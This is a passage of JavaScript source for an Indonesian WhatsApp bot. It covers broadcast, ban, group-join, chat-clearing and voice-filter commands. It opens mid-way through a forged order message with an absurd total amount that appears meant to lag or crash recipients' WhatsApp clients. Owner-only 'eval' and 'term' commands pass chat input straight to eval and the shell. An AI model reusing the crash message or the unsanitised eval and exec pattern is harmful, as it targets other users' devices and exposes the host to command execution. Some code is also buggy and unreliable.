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",
"itemCount": 2022,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "LOL",
"message":"Hallo Kak",
"sellerJid": "6289512545999p.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}}) 

Ramdani.relayWAMessage(res)
break     
//------------------<HEWAN MENU>---------------
                    
//------------------< Ingfo Bot >-------------------
      case 'runtime':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
              textImg(`${runtime(process.uptime())}`)
              break
       case 'youtube': 
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
              freply(`*Subcribe YT Owner :*\n https://youtube.com/channel/UCB157jomCne961WzYHpG4gg`)
              break
case 'y': 
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply('Y')
break
        case 'masukandata': 
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
             freply(`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI TRXNYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6283146208804`)
              break
      case 'ping':
      case 'speed': 
       if (!isRegist) return freply(mess.regist)
       if (isBanned) return freply(mess.banned)
              timestampe = speed();
              latensie = speed() - timestampe
              freply(`「 *RAMDANI BOTZ* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
              break
      case 'botstat': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              groups = Ramdani.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = Ramdani.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await Ramdani.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `\`\`\`BOT STATISTICS\`\`\`
\`\`\`• Group Chats : ${groups.length}\`\`\`
\`\`\`• Private Chats : ${privat.length}\`\`\`
\`\`\`• Total Chats : ${totalChat.length}\`\`\`
\`\`\`• Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`• Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\`• Baterai : ${baterai}% ${charger}\`\`\`
\`\`\`• Ram Usage : ${ram2}\`\`\`
\`\`\`• Platform : ${os.platform()}\`\`\`
\`\`\`• Hostname : ${os.hostname()}\`\`\`
\`\`\`• Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`• Wa Version: ${Ramdani.user.phone.wa_version}\`\`\`
\`\`\`• Os Version: ${Ramdani.user.phone.os_version}\`\`\`
\`\`\`• Device Manufacturer: ${Ramdani.user.phone.device_manufacturer}\`\`\`
\`\`\`• Device Model: ${Ramdani.user.phone.device_model}\`\`\`
\`\`\`• Os Build Number: ${Ramdani.user.phone.os_build_number}\`\`\``
             freply(teks)
             break  
//------------------< Owner Menu >-------------------
      case 'bc':
      case 'broadcast': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return  freply(mess.only.owner)
             if (args.length < 1) return freply('teks?')
             anu = await Ramdani.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await Ramdani.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             Ramdani.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             freply('Suksess broadcast')
             } else {
             for (let _ of anu) {
Ramdani.sendMessage(_.jid, 
			{"contentText": `*「 Siaran ${namabot} 」*\n.Ijin Siaran\n*Isi Pesan :* ${body.slice(4)}`,
			"footerText": '© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ',
			"buttons": [
			{"buttonId": `${prefix}menu`,
			"buttonText": {"displayText": "MENU"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             freply('Suksess broadcast')
}
             break
      case 'bcgc':
      case 'bcgroup':
      case 'broadcastgroup': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return  freply(mess.only.owner)
             if (args.length < 1) return freply('teks?')
             anu = await Ramdani.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await Ramdani.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             Ramdani.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             freply('Suksess broadcast')
             } else {
             for (let _ of anu) {
Ramdani.sendMessage(_.jid, 
			{"contentText": `*「 SIARAN RAMDANI BOTZ」*\n*Izin Siaran Ngap:v*\n*Pesan :* ${body.slice(4)}`,
			"footerText": '© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ',
			"buttons": [
			{"buttonId": `${prefix}menu`,
			"buttonText": {"displayText": "MENU"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             freply('Suksess broadcast')
}
             break
                 case 'block': 
                 if (!isRegist) return freply(mess.regist)
                 if (isBanned) return freply(mess.banned)
				 Ramdani.updatePresence(from, Presence.composing) 
				 Ramdani.chatRead (from)
					if (!isGroup) return freply(mess.only.group)
					if (!isOwner) return freply(mess.only.ownerB)
					Ramdani.blockUser (`${body.slice(7)}@c.us`, "add")
					Ramdani.sendMessage(from, `perintah Diterima, memblokir ${body.slice(7)}@c.us`, text)
					break
                    case 'unblock': 
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
					if (!isGroup) return freply(mess.only.group)
					if (!isOwner) return freply(mess.only.ownerB)
				    Ramdani.blockUser (`${body.slice(9)}@c.us`, "remove")
					Ramdani.sendMessage(from, `Perintah Diterima, membuka ${body.slice(9)}@c.us`, text)
					break   				
					case 'setppbot': 
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
					if (!isOwner) return freply(ind.ownerb())
					Ramdani.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return freply(`Kirim gambar dengan caption ${prefix}setppbot atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Ramdani.downloadAndSaveMediaMessage(enmedia)
					await Ramdani.updateProfilePicture(botNumber, media)
					freply('Makasih profil barunya😗')
					break 
		case 'setppbot2': 
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
				    if (!isOwner) return freply('*Only Owner bot*')
					Ramdani.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return freply(`Kirim gambar dengan caption ${prefix}setppbot atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Ramdani.downloadAndSaveMediaMessage(enmedia)
					await Ramdani.updateProfilePicture(botNumber, media)
					freply('Makasih profil barunya😗')
					break 
					case 'public': 
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
                if (!mek.key.fromMe && !isOwner) return freply('Fitur Khusus Owner!!')
                if (BanChats === false) return
                setting.BanChats = false
                BanChats = false
                fs.writeFileSync('./config/setting.json', JSON.stringify(setting, null, 2))
                freply(`「 *PUBLIC-MODE* 」`)
                break
        case 'self': 
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
                if (!mek.key.fromMe && !isOwner) return freply('Fitur Khusus Owner!!')
                if (setting.BanChats === true) return
                setting.BanChats = true
                uptime = process.uptime()
                BanChats = true
                fs.writeFileSync('./config/setting.json', JSON.stringify(setting, null, 2))
                freply(`「 *SELF-MODE* 」`)
                break
case 'public2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (!isOwner) return freply(mess.only.ownerB)
public = true
fdanzz('*LANGUAGE ENGLISH*\n_Success change to public mode_\n\n*BAHASA INDONESIA*\n_Berhasil mengubah ke mode publik_')
break
case 'self2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (!isOwner) return freply(mess.only.ownerB)
public = false
fdanzz('*LANGUAGE ENGLISH*\n_Success change to self mode_\n\n*BAHASA INDONESIA*\n_Berhasil mengubah ke mode self_')
freply('*⌜ SELF MODE ⌟*')
break 
                    case 'ban':
                    case 'banned':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
					if (!isOwner) return freply(mess.only.ownerB)
					bnnd = body.slice(6)
					ban.push(`${bnnd}@s.whatsapp.net`)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					freply(`Nomor wa.me/${bnnd} telah dibanned !`)
	                break
                    case 'unban':
                    case 'unbanned':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
					if (!isOwner) return freply(mess.only.ownerB)
					bnnd = body.slice(8)
					ban.splice(`${bnnd}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					freply(`Nomor wa.me/${bnnd} telah di unban!`)
		break
        case 'd':
        case 'del':
        case 'delete': 
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
        if (!isOwner) return freply(mess.only.ownerB)
					Ramdani.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
      case 'addupdate': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return freply(mess.only.owner)
             if (!q) return freply(`Example: ${command} update fitur`)
           _update.push(q)
             fs.writeFileSync('./database/bot/update.json', JSON.stringify(_update))
             freply(`Update fitur berhasil ditambahkan ke database!`)
             break
      case 'update': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
             for (let i of _update) {
             updateList += `࿃ *${i.replace(_update)}*\n\n`
}
             textImg(updateList)
             break
      case 'reset': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return freply(mess.only.owner)
             var reset = []
             glimit = reset
           _update = reset
             console.log('Hang tight, it\'s time to reset')
             fs.writeFileSync('./database/bot/limit.json', JSON.stringify(glimit))
             fs.readFileSync('./database/bot/update.json', JSON.stringify(_update))
             textImg('Oke Desu ~')
             break
      case 'exif': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return  freply(mess.only.owner)
             if (!q) return freply(mess.wrongFormat)
             if (!arg.split('|')) return freply(`Penggunaan ${prefix}exif nama|author`)
             exif.create(arg.split('|')[0], arg.split('|')[1])
             freply('sukses')
             break      
      case 'join':  
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!q) return freply('Linknya?')
             if (!isOwner) return freply(mess.only.owner)
             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return freply('Linknya Invalid Tod')
             link = args[0].replace('https://chat.whatsapp.com/','')
             fak = Ramdani.query({ json: ['action', 'invite', link],
             expect200: true })
             freply('Berhasil Masuk Grup')
             break
case 'join3':
            if (!isRegist) return freply(mess.regist)
            if (isBanned) return freply(mess.banned)
            if (!isOwner) return freply(mess.only.ownerB)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return freply(mess.Iv)
            hen = args[0]
            if (!q) return freply('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakeitem('pastikan link sudah benar!')
            var response = await Ramdani.acceptInvite(codeInvite)
            fakeitem('SUKSES')
            } catch {
            fakeitem('LINK ERROR!')
            }
        break
      case 'eval': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             try {
             if (!isOwner) return
             sy = args.join(' ')
             return eval(sy)
             } catch(e) {
             freply(`${e}`)
}
             break
      case 'getquoted': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             freply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
             break
      case 'clearall': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return  freply(mess.only.owner)
             anu = await Ramdani.chats.all()
             Ramdani.setMaxListeners(25)
             for (let _ of anu) {
             Ramdani.deleteChat(_.jid)
}
             freply('Sukses delete all chat :)')
             break
      case 'term': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return
             if (!q) return
             exec(q, (err, stdout) => {
             if (err) return freply(`${err}`)
             if (stdout) {
             freply(stdout)
}
})
             break 
      case 'shutdown': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return 
             freply(`Bye...`)
             await sleep(3000)
             process.exit()
             break
      case 'start': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return 
             freply(`OTEWE MENGHIDUPKAN MESIN??`)
             await sleep(3000)
             process.exit()
             break             
      case 'restart': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return 
             freply(mess.wait)
             exec(`node main`)
             freply('_Restarting Bot Success_')
             break
      case 'leaveall': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isOwner) return  freply(mess.only.owner)
             let totalgroup = Ramdani.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
             for (let id of totalgroup) {
             sendMess(id, 'Byee', null)
             await sleep(3000)
             Ramdani.groupLeave(id)
}
             break
//-----------< vn menu >-----------\\
                    case 'tupai': 
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
				    freply('PROSES')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return freply('Error!')
						hah = fs.readFileSync(ran)
						Ramdani.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: troli})
						fs.unlinkSync(ran)
					})
				break 
case 'addstik': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
	         if (!isOwner) return freply(mess.only.owner)
				if (!isQuotedSticker) return freply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return freply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Ramdani.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				Ramdani.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: troli})
				break
case 'addimg': 
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
				if (!isOwner) return freply(mess.only.owner)
				if (!isQuotedImage) return freply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return freply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Ramdani.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
